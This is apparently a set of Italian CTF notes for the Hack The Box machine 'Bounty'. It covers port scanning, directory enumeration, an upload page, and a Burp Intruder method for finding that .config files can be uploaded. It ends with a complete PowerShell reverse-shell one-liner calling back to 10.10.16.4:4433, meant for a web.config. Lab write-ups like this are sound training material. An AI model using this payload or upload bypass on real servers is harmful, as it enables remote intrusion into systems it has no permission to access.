@@ -1,0 +1,84 @@
+10.10.10.93
+
+masscan -p1-65535 10.10.10.93 --rate 1000 --banners -e tun0
+Discovered open port 80/tcp on 10.10.10.93 
+
+nmap -sC -sV -p80 10.10.10.93
+
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+sulla porta 80 c'è un sito con un'immagine
+
+provo enumration con gobuster:
+
+sudo gobuster  dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -q -n -e -x .aspx
+
+/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]
+/uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]
+/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
+http://10.10.10.93/transfer.aspx        [Size: 941]
+
+
+la pagina transfer.aspx permette di caricare un file
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head id="Head1"><title>
+	Secure File Transfer
+</title></head>
+<body>
+    <form name="form1" method="post" action="transfer.aspx" id="form1" enctype="multipart/form-data">
+<div>
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk1bkvh4HtDalqTbp8lj4jllCj+hA=" />
+</div>
+
+<div>
+
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWAgKH1/SBDwLt3oXMA/p+bp/O5aQj4QWpQFYkNQgipTNG" />
+</div>
+    <div>
+        <input type="file" name="FileUpload1" id="FileUpload1" />
+        <input type="submit" name="btnUpload" value="Upload" onclick="return ValidateFile();" id="btnUpload" />
+        <br />
+        <span id="Label1"></span>
+    </div>
+    </form>
+</body>
+</html>
+
+ci sono due campi hidden.
+
+non permette di caricare un file .txt (Invalid File)
+si deve capire ceh tipo di file permette di caricare 
+si può fare con burp suite usando una wordlist di possibili estensioni di files compatibili con iis/asp
+
+
+per farlo:
+    1) invio di una richeista per caricare un file "prova.txt" (intercettata da burp)
+    2) send to intruder
+    3) seleziona come position solo la parte .txt di prova.txt
+    4) carica la wordlist delle stensioni come payload e disattiva l'url encoding del payload (in fondo alla pagina dei payload)
+    5) lancia attacco, tutte le response hanno lunghezza 1355 (con Invalid File) tranne una che ha lunghezza 1350 (.config) //si potevano aggiungere anche dei grep match
+
+
+controllando la risposta è possibile caricare un file .config
+è possibile mettere una reverse shell anche in un file .config (web.config)
+
+cmd /c powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.4',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+
+
+
+
+
+
+
+
+
